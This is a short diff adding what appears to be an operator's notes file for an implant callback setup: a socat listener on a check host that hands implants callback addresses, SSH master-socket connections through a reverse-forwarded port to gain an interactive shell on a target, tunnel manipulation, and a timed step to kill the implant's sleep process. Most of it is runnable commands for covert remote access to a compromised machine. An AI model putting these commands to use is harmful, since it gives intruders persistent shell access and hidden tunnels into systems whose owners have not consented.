@@ -1,0 +1,29 @@
+#On CHK_IP
+//Create/edit info.sh
+cat <<EOF >info.sh
+echo -n "<CB_PORT>:<CB_IP>:<REMLIS>"
+EOF
+chmod +x info.sh
+socat -d -d TCP-LISTEN:<CHK_PORT>,fork,reuseaddr system:/path/to/info.sh
+
+#On Opstation
+#When ready to have interactive shell
+sed -ie "s/PubkeyAuthentication no #/PubkeyAuthentication yes #/" /etc/ssh/sshd_config && rm /etc/ssh/sshd_confige
+systemctl restart ssh
+
+//Initial Connection
+ssh -M -S /tmp/<target> -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -p <REMLIS> <user>@127.0.0.1
+
+//Getting an additional terminal
+ssh -S /tmp/<target> <user>
+
+//Tunnel manipulation using an existing socket
+ssh -S /tmp/<target> <user> -O [forward|cancel|exit} -[L|R] <tunnel_ip>:<tunnel_port>:<forward_ip>:<forward_port>
+
+****SUPER IMPORTANT STEP****
+//After connecting you will have no more than 2min from the establishment of the Remote listener you connected to to do the following
+ps -efH
+kill -9 <PID_of_Sleep_Cmd>
+
+//Note
+The sleep time can be adjusted to more than 2min when initially implanting or afterward by editing the script on target but is not recommended
